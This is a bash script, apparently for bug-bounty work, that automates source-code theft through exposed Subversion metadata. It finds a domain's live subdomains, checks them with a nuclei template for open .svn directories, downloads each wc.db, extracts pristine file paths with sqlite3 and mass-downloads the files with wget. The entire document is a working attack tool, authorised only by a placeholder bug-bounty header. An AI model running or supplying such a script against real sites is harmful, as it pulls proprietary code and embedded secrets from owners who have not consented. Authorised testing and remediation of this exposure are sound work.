#!/bin/bash

# Colors for messages
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Ask for the target domain
echo -e "${BLUE}SVN Exposure Automation Script${NC}"
echo -e "${BLUE}-----------------------------------${NC}"
read -p "Enter the target domain (e.g., example.com): " DOMAIN

# Check if the domain is not empty
if [ -z "$DOMAIN" ]; then
    echo -e "${RED}Error: No domain entered. Exiting.${NC}"
    exit 1
fi

# Variables
HEADER="X-Bug-bounty: your-username-here"
TEMPLATE_PATH="/home/kali/nuclei-templates/http/exposures/files/svn-wc-db.yaml"

# Step 1: Subfinder to find subdomains
echo -e "${GREEN}[*] Step 1: Finding subdomains for $DOMAIN...${NC}"
echo -e "${YELLOW}This step uses 'subfinder' to identify subdomains associated with the target domain.${NC}"
echo -e "${YELLOW}The identified subdomains will be saved in 'live_hosts.txt'.${NC}"
subfinder -d $DOMAIN -all | httpx -silent -rl 5 | tee live_hosts.txt

# Check if any subdomains were found
if [[ ! -s live_hosts.txt ]]; then
    echo -e "${RED}Warning: No live subdomains found. Exiting.${NC}"
    exit 1
fi

# Step 2: Probing for SVN exposure using Nuclei
echo -e "${GREEN}[*] Step 2: Checking for exposed .svn directories...${NC}"
echo -e "${YELLOW}This step uses 'nuclei' with the specified template to check if any of the identified subdomains have an exposed '.svn' directory.${NC}"
echo -e "${YELLOW}The results will be saved in 'svn_exposed.txt'.${NC}"
nuclei -l live_hosts.txt -t $TEMPLATE_PATH -rl 5 -H "$HEADER" -o svn_exposed.txt

# Step 3: Download wc.db if exposed
if [[ -s svn_exposed.txt ]]; then
    echo -e "${GREEN}[*] Step 3: Found exposed .svn directories.${NC}"
    echo -e "${YELLOW}Attempting to download 'wc.db' files from the exposed directories...${NC}"
    while IFS= read -r line; do
        wget "${line}/.svn/wc.db" -P wc_dbs/
    done < svn_exposed.txt
    echo -e "${YELLOW}The downloaded 'wc.db' files are saved in the 'wc_dbs/' directory.${NC}"
else
    echo -e "${RED}Notice: No exposed .svn directories were found. Exiting.${NC}"
    exit 1
fi

# Step 4: Extracting source code paths from wc.db
echo -e "${GREEN}[*] Step 4: Extracting source code paths from the 'wc.db' files...${NC}"
echo -e "${YELLOW}This step will query each 'wc.db' file to retrieve paths to the source code files.${NC}"
for db in wc_dbs/*.db; do
    echo -e "${BLUE}Processing $db...${NC}"
    sqlite3 "$db" 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;' | tee -a Snv_Database.txt
done
echo -e "${YELLOW}The paths to the source code files have been saved in 'Snv_Database.txt'.${NC}"

# Step 5: Creating URLs for the source code files
echo -e "${GREEN}[*] Step 5: Generating URLs for the source code files...${NC}"
echo -e "${YELLOW}This step will create URLs based on the paths extracted from 'wc.db'.${NC}"
cat Snv_Database.txt | cut -d"|" -f2 | sort -u | sed "s/^/https:\/\/$DOMAIN\//" | tee Urls_generated.txt
echo -e "${YELLOW}The URLs have been generated and saved in 'Urls_generated.txt'.${NC}"

# Step 6: Downloading the source code files
echo -e "${GREEN}[*] Step 6: Downloading the source code files...${NC}"
echo -e "${YELLOW}This step uses 'wget' to download the source code files from the generated URLs.${NC}"
wget --input-file=Urls_generated.txt -P Source_code
echo -e "${YELLOW}The source code files have been downloaded and saved in the 'Source_code/' directory.${NC}"

echo -e "${GREEN}[*] Process completed successfully.${NC}"
echo -e "${BLUE}You can find the downloaded source code files in the 'Source_code/' directory.${NC}"
